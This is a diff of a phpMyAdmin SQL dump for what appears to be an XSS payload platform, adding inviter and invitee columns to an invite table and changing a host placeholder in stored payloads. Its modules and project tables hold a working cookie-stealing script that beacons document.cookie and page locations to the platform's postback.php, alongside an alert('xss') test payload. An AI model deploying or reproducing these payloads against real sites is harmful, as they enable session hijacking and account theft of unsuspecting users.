@@ -3,7 +3,7 @@
 -- https://www.phpmyadmin.net/
 --
 -- Host: localhost:3306
--- Generation Time: Jun 20, 2020 at 03:42 AM
+-- Generation Time: Jul 15, 2020 at 05:13 AM
 -- Server version: 8.0.20-0ubuntu0.20.04.1
 -- PHP Version: 7.4.3
 
@@ -29,7 +29,9 @@ SET time_zone = "+00:00";
 --
 
 CREATE TABLE `invite` (
-  `code` varchar(255) COLLATE utf8mb4_bin NOT NULL
+  `code` varchar(255) COLLATE utf8mb4_bin NOT NULL,
+  `inviter` varchar(255) COLLATE utf8mb4_bin NOT NULL,
+  `invitee` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
 
 -- --------------------------------------------------------
@@ -50,7 +52,7 @@ CREATE TABLE `modules` (
 
 INSERT INTO `modules` (`guid`, `module_name`, `payload`) VALUES
 ('2ac3a5c7-6f17-4768-beab-324a82e75458', '弹窗测试', 'alert(&quot;xss&quot;)'),
-('df803ba4-e35b-47cc-b0be-8374f2e75210', '读取COOKIE', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{xsssite}postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);');
+('df803ba4-e35b-47cc-b0be-8374f2e75210', '读取COOKIE', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);');
 
 -- --------------------------------------------------------
 
@@ -71,7 +73,7 @@ CREATE TABLE `project` (
 --
 
 INSERT INTO `project` (`guid`, `user_guid`, `project_name`, `timestamp`, `payload`) VALUES
-('5WDCa1', '7032c695-f961-4144-b17c-2edc979cc5da', '回传Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{xsssite}postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
+('5WDCa1', '7032c695-f961-4144-b17c-2edc979cc5da', '回传Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
 ('Hq5Cu9', '7032c695-f961-4144-b17c-2edc979cc5da', '弹窗测试', '2020-06-19 11:30:10', 'alert(&quot;xss&quot;)');
 
 -- --------------------------------------------------------
